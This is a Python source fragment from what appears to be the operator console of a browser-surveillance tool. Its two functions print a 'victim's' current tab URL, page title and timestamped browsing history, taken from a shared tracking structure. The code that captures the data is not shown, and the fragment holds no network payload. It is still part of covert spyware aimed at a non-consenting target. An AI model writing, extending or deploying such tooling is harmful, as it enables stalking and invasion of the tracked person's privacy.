def show_current_url():
    """Display the victim's current active URL."""
    with LOCK:
        url   = ACTIVE_TAB['url']
        title = ACTIVE_TAB['title']
        ts    = ACTIVE_TAB['ts']
        tab_id = ACTIVE_TAB['tab_id']

    if not url:
        print(f"  {YELLOW}[*] No URL tracked yet — waiting for tab activity{RESET}")
        return

    t_str = time.strftime('%H:%M:%S', time.localtime(ts / 1000)) if ts else '??:??:??'
    ago = time.time() - (ts / 1000) if ts else 0

    print(f"  {BOLD}{CYAN}Current URL{RESET} (tab {tab_id}, updated {ago:.0f}s ago)")
    if title:
        print(f"  {BOLD}{title}{RESET}")
    print(f"  {GREEN}{url}{RESET}")


def show_tab_history():
    """Display browsing history for this session."""
    with LOCK:
        history = list(ACTIVE_TAB['history'])

    if not history:
        print(f"  {YELLOW}[*] No browsing history recorded yet{RESET}")
        return

    print(f"  {BOLD}Browsing history ({len(history)} entries):{RESET}")
    print(f"  {CYAN}{'─' * 60}{RESET}")

    for i, entry in enumerate(history, 1):
        url   = entry.get('url', '?')
        title = entry.get('title', '')
        ts    = entry.get('ts', 0)
        t_str = time.strftime('%H:%M:%S', time.localtime(ts / 1000)) if ts else '??:??:??'

        label = title if title else url
        if len(label) > 65:
            label = label[:62] + '...'

        print(f"  {CYAN}[{t_str}]{RESET} {label}")
        if title:
            trunc_url = url if len(url) <= 75 else url[:72] + '...'
            print(f"             {trunc_url}")

    print(f"  {CYAN}{'─' * 60}{RESET}")


